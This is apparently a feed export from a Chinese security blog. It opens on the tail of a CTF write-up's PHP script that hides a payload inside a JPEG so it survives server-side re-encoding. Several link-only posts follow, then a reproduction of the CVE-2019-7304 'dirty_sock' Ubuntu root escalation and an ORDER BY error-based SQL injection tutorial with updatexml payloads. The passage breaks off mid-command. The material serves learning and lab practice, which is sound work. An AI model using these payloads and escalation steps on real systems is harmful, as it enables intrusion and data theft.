class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params">$filename, $data, $unlink = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params">$errno, $errstr, $errfile, $errline</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (<span class="keyword">int</span>)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $order = <span class="literal">false</span>, $fromString = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.$filename.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params">$skip</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><strong>使用方法</strong></li></ul><p>1). 随便找一个jpg图片,<code>先上传至服务器然后再下载到本地保存为1.jpg</code><br>2). 使用脚本处理1.jpg,命令<code>php jpg_payload.php 1.jpg</code></p><blockquote><p>亲测有效，不愧是大佬，稳了一P。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-dc7fa57a91bd8172.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>参考</li></ul><p><a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p><hr><p><em>&lt;完&gt;太菜了，只能玩到这了，写的不好别喷，坐等其他Writeup</em></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文主要记录&lt;code&gt;DDCTF2019&lt;/code&gt;中部分web赛题的解题过程，仅学习参考使用。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://zzqsmile.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://zzqsmile.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap使用指南</title>
    <link href="http://zzqsmile.github.io/2019/04/06/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/"/>
    <id>http://zzqsmile.github.io/2019/04/06/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/</id>
    <published>2019-04-06T01:00:00.000Z</published>
    <updated>2019-04-06T13:27:38.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文旨在记录sqlmap使用方法</p></blockquote><a id="more"></a><ul><li><strong>sqlmap脑图</strong></li></ul><p><a href="https://github.com/bugku/Mind-Map/blob/master/SQLmap%E8%84%91%E5%9B%BE.jpg">https://github.com/bugku/Mind-Map/blob/master/SQLmap%E8%84%91%E5%9B%BE.jpg</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文旨在记录sqlmap使用方法&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="tools" scheme="http://zzqsmile.github.io/categories/tools/"/>
    
    
    <category term="sqlmap" scheme="http://zzqsmile.github.io/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>跨域资源共享CORS</title>
    <link href="http://zzqsmile.github.io/2019/04/04/%E4%BC%A0%E9%80%81%E9%97%A8/CORS/"/>
    <id>http://zzqsmile.github.io/2019/04/04/%E4%BC%A0%E9%80%81%E9%97%A8/CORS/</id>
    <published>2019-04-04T01:00:00.000Z</published>
    <updated>2019-04-04T07:33:22.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本片文章为传送门，其内容是对跨域资源共享CORS的详解,写的特别详细</strong></p><a id="more"></a><p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;本片文章为传送门，其内容是对跨域资源共享CORS的详解,写的特别详细&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="http://zzqsmile.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="传送门" scheme="http://zzqsmile.github.io/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTF必备技能之编码大全</title>
    <link href="http://zzqsmile.github.io/2019/03/29/%E4%BC%A0%E9%80%81%E9%97%A8/%E7%BC%96%E7%A0%81/"/>
    <id>http://zzqsmile.github.io/2019/03/29/%E4%BC%A0%E9%80%81%E9%97%A8/%E7%BC%96%E7%A0%81/</id>
    <published>2019-03-29T01:00:00.000Z</published>
    <updated>2019-03-29T14:11:56.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本片文章为传送门，其内容是关于编码的知识讲解</strong></p><a id="more"></a><p><a href="https://mp.weixin.qq.com/s/a28yG1bBg-dyyZNG0R8qKw">https://mp.weixin.qq.com/s/a28yG1bBg-dyyZNG0R8qKw</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;本片文章为传送门，其内容是关于编码的知识讲解&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="编码" scheme="http://zzqsmile.github.io/categories/%E7%BC%96%E7%A0%81/"/>
    
    
    <category term="传送门" scheme="http://zzqsmile.github.io/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>MySQL数据库安全测试</title>
    <link href="http://zzqsmile.github.io/2019/03/27/Database/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    <id>http://zzqsmile.github.io/2019/03/27/Database/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</id>
    <published>2019-03-27T01:00:00.000Z</published>
    <updated>2019-03-27T07:52:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>一发传送门，主要讲了MySQL数据库的相关安全测试，和MySQL提权</p><a id="more"></a><p>传送门：<a href="http://www.mchz.com.cn/cn/service/Safety-Lab/info_26_itemid_2015.html">http://www.mchz.com.cn/cn/service/Safety-Lab/info_26_itemid_2015.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一发传送门，主要讲了MySQL数据库的相关安全测试，和MySQL提权&lt;/p&gt;</summary>
    
    
    
    <category term="Database" scheme="http://zzqsmile.github.io/categories/Database/"/>
    
    
    <category term="mysql" scheme="http://zzqsmile.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu本地提权漏洞复现(CVE-2019-7304)</title>
    <link href="http://zzqsmile.github.io/2019/02/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2019-7304)/"/>
    <id>http://zzqsmile.github.io/2019/02/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2019-7304)/</id>
    <published>2019-02-19T01:00:00.000Z</published>
    <updated>2019-02-20T02:54:18.000Z</updated>
    
    <content type="html"><![CDATA[<h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu Linux的默认安装&#96;snapd&#96;服务，由于snapd API中的一个错误，任何本地用户都可以利用此漏洞获取对系统的直接root访问权限。</span><br></pre></td></tr></table></figure><a id="more"></a><h5 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.37.1以下</span><br></pre></td></tr></table></figure><h5 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">zzq@zzq-virtual-machine:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:    Ubuntu</span><br><span class="line">Description:    Ubuntu 16.04.5 LTS</span><br><span class="line">Release:    16.04</span><br><span class="line">Codename:    xenial</span><br><span class="line">zzq@zzq-virtual-machine:~$ snap version</span><br><span class="line">snap    2.34.2</span><br><span class="line">snapd   2.34.2</span><br><span class="line">series  16</span><br><span class="line">ubuntu  16.04</span><br><span class="line">kernel  4.15.0-29-generic</span><br><span class="line">zzq@zzq-virtual-machine:~$ </span><br><span class="line"></span><br><span class="line">python2</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/8166147-61c6345b3bd5d4c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><ul><li>下载提权使用的exp<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzq@zzq-virtual-machine:~$ git clone https:&#x2F;&#x2F;github.com&#x2F;initstring&#x2F;dirty_sock.git</span><br></pre></td></tr></table></figure></li><li>进入下载的目录，里面是两个py文件，分别是不同的利用脚本</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-c1b6134ff611d994.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><hr><h6 id="方式-1：使用dirty-sockv1-py"><a href="#方式-1：使用dirty-sockv1-py" class="headerlink" title="方式 1：使用dirty_sockv1.py"></a>方式 1：使用dirty_sockv1.py</h6><ul><li><p>前提条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.所在的环境需要能够访问到外部网络。</span><br><span class="line">2.需要ubuntu sso的账号，自行到官网注册，地址：https:&#x2F;&#x2F;login.ubuntu.com&#x2F; </span><br><span class="line">3.所在的环境需要安装ssh服务</span><br></pre></td></tr></table></figure></li><li><p>下面是我自己注册的账户</p></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-b548d9e51240b5da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><ul><li>接下来首先在本地生成公钥<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;&lt;you email&gt;&quot;</span><br></pre></td></tr></table></figure><img src="https://upload-images.jianshu.io/upload_images/8166147-6570c8d9eff0462a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li></ul><ul><li>将生成的公钥导入到ubuntu账号SSH keys中</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-35a57d413be8b219.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-bd3d31525806744b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><ul><li>最后在本地执行dirty_sockv1.py，执行之前一定要先安装ssh服务</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python dirty_sockv1.py -u &quot;&lt;your email&gt;&quot; -k &quot;私钥&quot;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/8166147-660e419ec5c4627f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><ul><li>成功执行完毕，再执行<code>sudo -i</code>，就成功提权到<code>root</code><br><img src="https://upload-images.jianshu.io/upload_images/8166147-bb2d301d6d25c072.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li></ul><hr><h6 id="方式-2：使用dirty-sockv2-py"><a href="#方式-2：使用dirty-sockv2-py" class="headerlink" title="方式 2：使用dirty_sockv2.py"></a>方式 2：使用dirty_sockv2.py</h6><ul><li>第2中方法操作简单：无需任何条件，直接执行dirty_sockv2.py即可，执行成功后会创建一个<code>dirty_sock</code>用户，密码也为<code>dirty_sock</code> ，如下：</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-16d3d8358de19ed1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><ul><li><p>接下来先切换到用户<code>dirty_sock</code>，密码<code>dirty_sock</code>，然后再通过<code>sudo -i</code>提升到<code>root</code>权限</p></li><li><p>在执行<code>su dirty_sock</code>的时候可能会遇到以下情况，<code>No passwd entry for user &#39;dirty_sock&#39;</code>不幸的我是遇到了</p></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-d35b95e53c2a99b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><ul><li>如果遇到此情况按下图操作，查看任务进度，等到doing任务执行完之后再进行尝试，如果仍不行，请使用方法一。</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-35112bee8df47a53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="http://lawlietweb.com/2019/02/17/ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0%EF%BC%88CVE-2019-7304%EF%BC%89/">http://lawlietweb.com/2019/02/17/ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0%EF%BC%88CVE-2019-7304%EF%BC%89/</a></p><p><a href="https://www.anquanke.com/post/id/170942">https://www.anquanke.com/post/id/170942</a></p>]]></content>
    
    
    <summary type="html">&lt;h5 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h5&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Ubuntu Linux的默认安装&amp;#96;snapd&amp;#96;服务，由于snapd API中的一个错误，任何本地用户都可以利用此漏洞获取对系统的直接root访问权限。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="权限提升" scheme="http://zzqsmile.github.io/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    
    <category term="提权" scheme="http://zzqsmile.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Order by排序注入方法小总结</title>
    <link href="http://zzqsmile.github.io/2018/11/12/web%E5%AE%89%E5%85%A8/Order_by%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>http://zzqsmile.github.io/2018/11/12/web%E5%AE%89%E5%85%A8/Order_by%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/</id>
    <published>2018-11-12T01:00:00.000Z</published>
    <updated>2019-04-04T07:13:50.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>今天总结一下注入点在order by排序注入，学习一下记录下这个过程</em><br><strong>声明：此文谨供学习记录研究使用，切勿用于非法用途，否则后果自负！</strong></p><a id="more"></a><h5 id="注入方法介绍"><a href="#注入方法介绍" class="headerlink" title="注入方法介绍"></a>注入方法介绍</h5><ul><li>正常语句</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select * from users order by id;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users order by id desc;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>其中<code>select * from users order by id desc;</code>的<code>desc</code>是可控的传参值。</p></blockquote><hr><h6 id="order-by-与报错注入"><a href="#order-by-与报错注入" class="headerlink" title="order by 与报错注入"></a>order by 与报错注入</h6><blockquote><p>当页面出现mysql报错信息时，注入点在 <code>order by</code>后面，此时可以利用报错信息进行注入。</p></blockquote><ul><li>下面进行报错注入<ul><li>首先获取基本一些基本信息总结</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select database())),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39;        &#x2F;&#x2F;获取当前数据库</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select version())),0));         </span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53&#39;      &#x2F;&#x2F;获取数据库版本</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select user())),0));        </span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39;     &#x2F;&#x2F;获取用户</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select @@datadir)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~E:\soft\phpmystudy\MySQL\data\&#39;        &#x2F;&#x2F;获取数据库路径</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select @@version_compile_os)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~Win32&#39;      &#x2F;&#x2F;获取操作系统</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select @@basedir)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~E:&#x2F;soft&#x2F;phpmystudy&#x2F;MySQL&#x2F;&#39;       &#x2F;&#x2F;mysql安装路径</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select session_user())),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39;      &#x2F;&#x2F;获取连接数据库的用户名</span><br><span class="line">mysql&gt; select * from users order by id 